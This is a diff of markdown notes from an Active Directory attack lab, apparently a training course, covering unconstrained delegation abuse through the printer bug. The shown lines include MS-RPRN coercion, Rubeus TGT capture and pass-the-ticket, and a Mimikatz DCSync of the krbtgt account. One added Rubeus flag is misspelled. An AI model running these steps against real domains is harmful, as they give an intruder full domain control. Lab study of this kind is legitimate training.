@@ -256,19 +256,6 @@ Invoke-Mimikatz -Command '"kerberos::ptt C:\Users\appadmin\Documents\user1\[0;2c
 
 # **Unconstrained Delegation - Printer Bug**
 
-- Discover domain computers which have unconstrained delegation enabled :
-
-
-```powershell
-# Powerview
-Get-DomainComputer -UnConstrained
-
-# AD Module
-Get-ADComputer -Filter {TrustedForDelegation -eq $True}
-Get-ADUser -Filter {TrustedForDelegation -eq $True
-```
-
-
 
 - We can capture the TGT of dcorp-dc$ by using `Rubeus` on **dcorp-appsrv**:
 
@@ -286,3 +273,17 @@ MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local \\dcorp-appsrv.dollarcorp.mone
 ```
 
 
+- If you are attacking from a Linux machine, check out Coercer - (https://github.com/p0dalirius/Coercer) - for other MS protocols that can be abused for coercion.
+
+
+
+- Copy the base64 encoded TGT, remove extra spaces (if any) and use it on the student VM:
+
+```powershell
+Rubeus.exe ptt /tikcet:
+```
+
+
+- Once the ticket is injected, run DCSync:
+Invoke-Mimikatz -Command '"lsadump::dcsync
+/user:dcorp\krbtgt"'
